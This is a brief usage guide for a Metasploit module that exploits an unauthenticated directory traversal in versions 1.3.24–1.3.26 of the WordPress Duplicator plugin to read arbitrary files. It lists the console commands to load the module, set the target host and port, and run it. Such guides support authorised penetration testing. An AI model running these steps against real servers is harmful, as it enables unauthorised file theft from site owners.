**The description of current metasploit exploit**
This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin          'Duplicator' version 1.3.24-1.3.26, allowing arbitrary file read with the web server privileges.          This vulnerability was being actively exploited when it was discovered.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wp_duplicator_file_read
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.